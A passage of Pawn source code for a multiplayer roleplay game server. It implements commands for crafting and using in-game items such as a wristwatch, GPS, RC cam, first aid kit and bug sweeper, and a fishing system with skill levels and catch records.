			return 1;
		}
		if(strcmp(choice,"screwdriver",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 1;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"wristwatch",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 500)
			{
				price = 500;
				weapon = 3;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"tire",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 250)
			{
				price = 250;
				weapon = 5;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"firstaid",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 7;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"camera",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 250)
			{
				price = 250;
				weapon = 8;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"rccam",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 8000)
			{
				price = 8000;
				weapon = 9;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"receiver",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 5000)
			{
				price = 5000;
				weapon = 10;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}
		else if(strcmp(choice,"gps",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 11;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}

		else if(strcmp(choice,"bugsweep",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 10000)
			{
				price = 10000;
				weapon = 12;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}

		else if(strcmp(choice,"parachute",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 50)
			{
				price = 50;
				weapon = 13;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that!");
				return 1;
			}
		}

		else { SendClientMessage(playerid,COLOR_GREY,"   Invalid Craft name!"); return 1; }
		if(ProxDetectorS(5.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				format(string, sizeof(string), "   You have given yourself a %s.", choice);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				switch(PlayerInfo[playerid][pSex])
				{
					case 1: format(string, sizeof(string), "* %s created something from Materials, and hands it to himself.", GetPlayerNameEx(playerid));
					case 2: format(string, sizeof(string), "* %s created something from Materials, and hands it to herself.", GetPlayerNameEx(playerid));
				}
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

				PlayerInfo[playerid][pMats] -= price;
				//PlayerInfo[playerid][pCraftSkill]++;

				SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
				switch(weapon) {
					case 1: {
						PlayerInfo[playerid][pScrewdriver]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/sellgun");
					}
					case 3: {
						PlayerInfo[playerid][pWristwatch]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/wristwatch");
					}
					case 5: {
						PlayerInfo[playerid][pTire]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/repair");
					}
					case 7: {
						PlayerInfo[playerid][pFirstaid]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/firstaid");
					}
					case 8: {
						GivePlayerValidWeapon(playerid, 43, 50);
					}
					case 9: {
						PlayerInfo[playerid][pRccam]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/rccam");
					}
					case 10: {
						PlayerInfo[playerid][pReceiver]++;
						SetPVarInt(playerid, "pReceiverMLeft", 40);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "You will receive the next four department radio messages.");
					}
					case 11: {
						PlayerInfo[playerid][pGPS]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/gps");
					}
					case 12: {
						PlayerInfo[playerid][pSweep]++;
						PlayerInfo[playerid][pSweepLeft] = 3;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/sweep");
					}
					case 13: {
						GivePlayerValidWeapon(playerid, 46, 99999);
					}
				}
				return 1;
			}

			format(string, sizeof(string), "* You offered %s to buy a %s.", GetPlayerNameEx(giveplayerid), choice);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Craftsman %s wants to sell you a %s, (type /accept craft) to buy.", GetPlayerNameEx(playerid), choice);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			CraftOffer[giveplayerid] = playerid;
			CraftId[giveplayerid] = weapon;
			CraftMats[giveplayerid] = price;
			format(CraftName[giveplayerid], 50, "%s", choice);
			SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
		return 1;
	}
}

CMD:inventory(playerid, params[])
{
    new str[32];
    SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
	SendClientMessage(playerid, COLOR_YELLOW, "<< Craft Inventory >>");
	format(str, sizeof(str), "Screwdriver: %d", PlayerInfo[playerid][pScrewdriver]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Wristwatch: %d Tire: %d", PlayerInfo[playerid][pWristwatch], PlayerInfo[playerid][pTire]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Firstaid: %d   Rccam: %d", PlayerInfo[playerid][pFirstaid], PlayerInfo[playerid][pRccam]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Receiver: %d   GPS: %d", PlayerInfo[playerid][pReceiver], PlayerInfo[playerid][pGPS]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Bug Sweep: %d", PlayerInfo[playerid][pSweep]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	return 1;
}

CMD:ww(playerid, params[])
{
	return cmd_wristwatch(playerid, params);
}

CMD:wristwatch(playerid, params[])
{
	if(PlayerInfo[playerid][pWristwatch] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "wristwatchonoff") == 0)
		{
			SetPVarInt(playerid, "wristwatchonoff", 1);
			new hour,minuite,second;
			gettime(hour,minuite,second);
			FixHour(hour);
			hour = shifthour;
			if(minuite < 10)
			{
				format(string, sizeof(string), "%d:0%d", hour, minuite);
			}
			else
			{
				format(string, sizeof(string), "%d:%d", hour, minuite);
			}
			TextDrawShowForPlayer(playerid, WristWatch);
			format(string, sizeof(string), "* %s turns on their wristwatch.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			TextDrawHideForPlayer(playerid, WristWatch);
			DeletePVar(playerid, "wristwatchonoff");
			format(string, sizeof(string), "* %s turns off their wristwatch.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have a wristwatch!");
	}
	return 1;
}

CMD:firstaid(playerid, params[])
{
	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being in a arena!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") == 1)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
		return 1;
	}
 	if(PlayerBoxing[playerid] == 1)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "You can't use firstaid while you're boxing.");
     	return 1;
   	}
	if(PlayerInfo[playerid][pFirstaid] > 0)
	{
		if(GetPVarInt(playerid, "usingfirstaid") == 0)
		{
			new string[128];
			PlayerInfo[playerid][pFirstaid]--;
			SetPVarInt(playerid, "firstaid5", SetTimerEx("firstaid5", 5000, 1, "d", playerid));
			SetPVarInt(playerid, "firstaidexpire", SetTimerEx("firstaidexpire",10*60000, 0, "d", playerid));
			SetPVarInt(playerid, "usingfirstaid", 1);
			format(string, sizeof(string), "* %s uses a first aid kit.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're already using first aid!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have a first aid kit!");
	}
	return 1;
}

CMD:rccam(playerid, params[])
{
	if(PlayerInfo[playerid][pRccam] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "rccam") == 0)
		{
			if(IsPlayerInAnyVehicle(playerid))
				return SendClientMessage(playerid, COLOR_GRAD1, "You must be on foot to place an RCCam!");

			if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != 0)
				return SendClientMessage(playerid, COLOR_GRAD1, "You must be outside to place an RCCam!");

			PlayerInfo[playerid][pRccam]--;
			SetPVarInt(playerid, "rccam", 1);
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPVarFloat(playerid, "rcX", X);
			SetPVarFloat(playerid, "rcY", Y);
			SetPVarFloat(playerid, "rcZ", Z);
			if(GetPVarInt(playerid, "rcveh") != 0)
			{
				DestroyVehicle(GetPVarInt(playerid, "rcveh"));
				VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			}
			SetPVarInt(playerid, "rcveh", AddStaticVehicle(594, X, Y, Z, 0, 0, 0));
			PutPlayerInVehicle(playerid, GetPVarInt(playerid, "rcveh"), 0);
			SetPVarInt(playerid, "rccamtimer", SetTimerEx("rccam", 60000, 0, "d", playerid));
			format(string, sizeof(string), "* %s places something on the ground.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			DestroyVehicle(GetPVarInt(playerid, "rcveh"));
			VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
			DeletePVar(playerid, "rccam");
			KillTimer(GetPVarInt(playerid, "rccamtimer"));
		}
	}
	else
	{
		if(GetPVarInt(playerid, "rccam") == 1)
		{
			DestroyVehicle(GetPVarInt(playerid, "rcveh"));
			VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
			DeletePVar(playerid, "rccam");
			KillTimer(GetPVarInt(playerid, "rccamtimer"));
			return 1;
		}
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have an RC Cam!");
	}
	return 1;
}

CMD:gps(playerid, params[])
{
	if(PlayerInfo[playerid][pGPS] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "gpsonoff") == 0)
		{
			format(string, sizeof(string), "* %s turns on their GPS.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "gpsonoff", 1);
			GPS[playerid] = TextDrawCreate(85.000000, 322.000000, "Loading..");
			TextDrawAlignment(GPS[playerid], 2);
			TextDrawBackgroundColor(GPS[playerid], 255);
			TextDrawFont(GPS[playerid], 0);
			TextDrawLetterSize(GPS[playerid], 0.809998, 1.500000);
			TextDrawColor(GPS[playerid], -1);
			TextDrawSetOutline(GPS[playerid], 1);
			TextDrawSetProportional(GPS[playerid], 1);
			TextDrawShowForPlayer(playerid, GPS[playerid]);
		}
		else
		{
			format(string, sizeof(string), "* %s turns off their GPS.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DeletePVar(playerid, "gpsonoff");
			TextDrawDestroy(GPS[playerid]);
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have a GPS!");
	}
	return 1;
}

CMD:sweep(playerid, params[])
{
	if(PlayerInfo[playerid][pSweep] > 0)
	{
		if(PlayerInfo[playerid][pSweepLeft] > 0)
		{
			new string[128], giveplayerid;
			if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sweep [playerid/partofname]");

			if(!ProxDetectorS(4.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "You need to be close to the person.");
			PlayerInfo[playerid][pSweepLeft]--;
			format(string, sizeof(string), "* %s sweeps a large wand around %s's body...", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			if(PlayerInfo[giveplayerid][pBugged] > 0)
			{
				PlayerInfo[giveplayerid][pBugged] = 0;
				format(string, sizeof(string), "* A small spark is seen as the bug on %s shorts out.", GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "(bug) %s: *static*", GetPlayerNameEx(giveplayerid));
				SendBugMessage(2, COLOR_LIGHTGREEN, string);
			}
			else
			{
				ProxDetector(30.0, playerid, "Nothing happens.", COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Your Bug Sweeper has ran out of batteries!");
			PlayerInfo[playerid][pSweep]--;
			PlayerInfo[playerid][pSweepLeft] = 3;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have a bug sweep!");
	}
	return 1;
}

CMD:receiver(playerid, params[])
{
	if(PlayerInfo[playerid][pReceiver] > 0)
	{
		if(!GetPVarType(playerid, "pReceiverOn"))
		{
			SendClientMessage(playerid, COLOR_YELLOW, "You've turned on your receiver.");
			SetPVarInt(playerid, "pReceiverOn", 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_YELLOW, "You've turned off your receiver.");
			DeletePVar(playerid, "pReceiverOn");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You don't have a receiver.");
	}
	return 1;
}

CMD:leaderhelp(playerid, params[])
{
    if(PlayerInfo[playerid][pLeader] >= 1) {
        SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
        SendClientMessage(playerid, COLOR_WHITE,"*** LEADER HELP *** - Type a command for more infomation.");
        SendClientMessage(playerid, COLOR_GRAD3,"*** LEADERS *** /invite /uninvite /giverank /ouninvite");
    }
    else {
        SendClientMessage(playerid, COLOR_GREY, "You're not a leader.");
    }
    return 1;
}

CMD:fishhelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** FISH HELP *** - type a command for more infomation.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /fish (Try to catch a fish)   /fishes (Show the fishes you have caught)");
    SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /throwback (Throw the last fish you caught back)   /throwbackall");
    SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /releasefish (Release one of your fishes)");
    SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /sellfish (Sell your fish at a 24/7) /sellallfish (Sells all your fishes that can be sold)");
    return 1;
}

CMD:fish(playerid, params[])
{
	if(PlayerInfo[playerid][pFishes] > 5)
	{
		SendClientMessage(playerid, COLOR_GREY, "You've caught enough fish for now - take a break.");
		return 1;
	}
	if(Fishes[playerid][pWeight1] > 0 && Fishes[playerid][pWeight2] > 0 && Fishes[playerid][pWeight3] > 0 && Fishes[playerid][pWeight4] > 0 && Fishes[playerid][pWeight5] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't carry more than five fish at a time - sell or release them first.");
		return 1;
	}

	new string[128];
	new Veh = GetPlayerVehicleID(playerid);
	if((IsAtFishPlace(playerid)) || IsABoat(Veh))
	{
		new Caught;
		new rand;
		new fstring[MAX_PLAYER_NAME];
		new Level = PlayerInfo[playerid][pFishSkill];
		if(Level >= 0 && Level < 50) { Caught = random(20)-7; }
		else if(Level >= 50 && Level < 100) { Caught = random(50)-20; }
		else if(Level >= 100 && Level < 200) { Caught = random(100)-50; }
		else if(Level >= 200 && Level < 400) { Caught = random(160)-60; }
		else if(Level >= 400) { Caught = random(180)-70; }
		rand = random(FishNamesNumber);
		if(Caught <= 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "The line snapped.");
			return 1;
		}
		else if(rand == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "You caught a jacket and threw it away.");
			return 1;
		}
		else if(rand == 4)
		{
			SendClientMessage(playerid, COLOR_GREY, "You caught a pair of trousers and threw it away.");
			return 1;
		}
		else if(rand == 7)
		{
			SendClientMessage(playerid, COLOR_GREY, "You caught a can and threw it away.");
			return 1;
		}
		else if(rand == 10)
		{
			SendClientMessage(playerid, COLOR_GREY, "You caught a pair of shoes and threw it away.");
			return 1;
		}
		else if(rand == 13)
		{
			SendClientMessage(playerid, COLOR_GREY, "You caught some garbage and threw it away.");
			return 1;
		}
		else if(rand == 20)
		{
			new mrand = random(50);
			format(string, sizeof(string), "* You caught a bag filled with money ($%d).", mrand);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, mrand);
			return 1;
		}
		if(Fishes[playerid][pWeight1] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish1], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight1] = Caught;
			format(string, sizeof(string), "* You have caught a %s, weighing %d pounds.", Fishes[playerid][pFish1], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 1;
			Fishes[playerid][pFid1] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Your old record of %d pounds has been passed, your new record is %d pounds.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight2] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish2], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight2] = Caught;
			format(string, sizeof(string), "* You have caught a %s, weighing %d pounds.", Fishes[playerid][pFish2], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 2;
			Fishes[playerid][pFid2] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Your old record of %d pounds has been passed, your new record is %d pounds.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight3] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish3], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight3] = Caught;
			format(string, sizeof(string), "* You have caught a %s, weighing %d pounds.", Fishes[playerid][pFish3], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 3;
			Fishes[playerid][pFid3] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Your old record of %d pounds has been passed, your new record is %d pounds.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight4] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish4], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight4] = Caught;
			format(string, sizeof(string), "* You have caught a %s, weighing %d pounds.", Fishes[playerid][pFish4], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 4;
			Fishes[playerid][pFid4] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Your old record of %d pounds has been passed, your new record is %d pounds.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight5] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish5], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight5] = Caught;
			format(string, sizeof(string), "* You have caught a %s, weighing %d pounds.", Fishes[playerid][pFish5], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 5;
			Fishes[playerid][pFid5] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Your old record of %d pounds has been passed, your new record is %d pounds.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You don't have any space for your fish, see /fishhelp.");
			return 1;
		}
		if(PlayerInfo[playerid][pFishSkill] == 50)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Fishing Skill is now Level 2, you can now catch larger fish."); }
		else if(PlayerInfo[playerid][pFishSkill] == 100)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Fishing Skill is now Level 3, you can now catch larger fish."); }
		else if(PlayerInfo[playerid][pFishSkill] == 200)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Fishing Skill is now Level 4, you can now catch larger fish."); }
		else if(PlayerInfo[playerid][pFishSkill] == 400)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Fishing Skill is now Level 5, you can now catch larger fish."); }
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the Santa Maria Pier, or on a fishing boat.");
		return 1;
	}
	return 1;
}

CMD:fishes(playerid, params[])
{
	new string[128];

	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Fishes __________________|");
	format(string, sizeof(string), "** (1) Fish: %s.   Weight: %d.", Fishes[playerid][pFish1], Fishes[playerid][pWeight1]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (2) Fish: %s.   Weight: %d.", Fishes[playerid][pFish2], Fishes[playerid][pWeight2]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (3) Fish: %s.   Weight: %d.", Fishes[playerid][pFish3], Fishes[playerid][pWeight3]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (4) Fish: %s.   Weight: %d.", Fishes[playerid][pFish4], Fishes[playerid][pWeight4]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (5) Fish: %s.   Weight: %d.", Fishes[playerid][pFish5], Fishes[playerid][pWeight5]);
	SendClientMessage(playerid, COLOR_GREY, string);
	SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
	return 1;
}

CMD:releasefish(playerid, params[])
{
	new fishid;
	if(sscanf(params, "d", fishid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /releasefish [fish 1-5]");

	if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_WHITE, "USAGE: /releasefish [fish 1-5]"); return 1; }
	else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "That slot is empty."); return 1; }
	else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "That slot is empty."); return 1; }
	else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "That slot is empty."); return 1; }
	else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "That slot is empty."); return 1; }
	else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "That slot is empty."); return 1; }
	ClearFishID(playerid, fishid);
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	SendClientMessage(playerid, COLOR_GREY, "You released a fish.");
	return 1;
}

CMD:throwback(playerid, params[])
{
	if(Fishes[playerid][pLastFish] > 0)
	{
		ClearFishID(playerid, Fishes[playerid][pLastFish]);
		Fishes[playerid][pLastFish] = 0;
		Fishes[playerid][pFishID] = 0;
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have thrown back your last fish.");
	}
	else
	{
